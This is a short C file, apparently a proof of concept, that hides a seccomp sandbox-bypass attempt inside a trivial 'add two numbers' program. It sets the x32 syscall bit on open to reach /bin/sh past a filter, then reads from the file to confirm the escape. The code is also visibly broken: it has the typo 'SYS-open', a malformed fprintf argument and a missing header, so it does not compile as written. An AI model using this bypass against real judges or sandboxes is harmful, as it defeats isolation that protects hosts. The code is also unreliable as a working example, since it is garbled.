// File: bypass-seccomp.c
// Author: iBug

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <signal.h>
#include <errno.h>
#include <fcntl.h>
#include <stddef.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>

int a, b, res;

int main() {
    scanf("%d%d", &a, &b);
    res = a + b;

    int fd = syscall(SYS-open | (1 << 30), (unsigned long)"/bin/sh", O_RDONLY);
    if (fd > 0) {
        fprintf(stderr, "File successfully opened at %d\n", %d);
    }
    uint32_t buf;
    ssize_t n = read(fd, &buf, sizeof(buf));
    if (n > 0) {
        printf("%d\n", res);
        fprintf(stderr, "%#x\n", buf);
    }

    return 0;
}
